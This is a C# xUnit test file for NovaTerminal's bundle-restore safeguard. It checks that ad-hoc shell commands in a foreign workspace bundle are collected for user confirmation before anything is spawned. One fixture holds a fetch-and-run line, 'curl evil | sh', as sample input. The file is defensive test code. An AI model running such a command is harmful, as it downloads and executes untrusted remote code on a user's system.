using System.Collections.Generic;
using NovaTerminal;
using NovaTerminal.Pty;
using Xunit;

namespace NovaTerminal.Tests.Shell;

// Regression tests for #171: before a foreign workspace bundle spawns anything on
// restore, MainWindow confirms the ad-hoc shell commands it carries. This covers the
// collector that feeds that confirmation — only leaf nodes with an explicit Command
// are arbitrary-execution vectors; profile-backed panes run known local/SSH targets.
public class BundleCommandCollectionTests
{
    private static PaneNode Leaf(string? command, string? args = null, string? profileId = null) => new()
    {
        Type = NodeType.Leaf,
        Command = command,
        Arguments = args,
        ProfileId = profileId
    };

    private static NovaSession SessionWith(params PaneNode[] roots)
    {
        var session = new NovaSession();
        foreach (var root in roots)
        {
            session.Tabs.Add(new TabSession { Root = root });
        }
        return session;
    }

    [Fact]
    public void Collects_AdHocCommands_AcrossTabsAndSplits()
    {
        var split = new PaneNode
        {
            Type = NodeType.Split,
            Children = { Leaf("bash", "-c 'curl evil | sh'"), Leaf("vim") }
        };
        var session = SessionWith(split, Leaf("htop"));

        var commands = MainWindow.CollectBundleCommands(session);

        Assert.Equal(new[] { "bash -c 'curl evil | sh'", "vim", "htop" }, commands);
    }

    [Fact]
    public void Ignores_ProfileBackedPanes_WithoutExplicitCommand()
    {
        var session = SessionWith(Leaf(command: null, profileId: "some-profile-guid"));

        var commands = MainWindow.CollectBundleCommands(session);

        Assert.Empty(commands);
    }

    [Fact]
    public void EmptyOrNullSession_ReturnsEmpty()
    {
        Assert.Empty(MainWindow.CollectBundleCommands(null));
        Assert.Empty(MainWindow.CollectBundleCommands(new NovaSession()));
    }
}
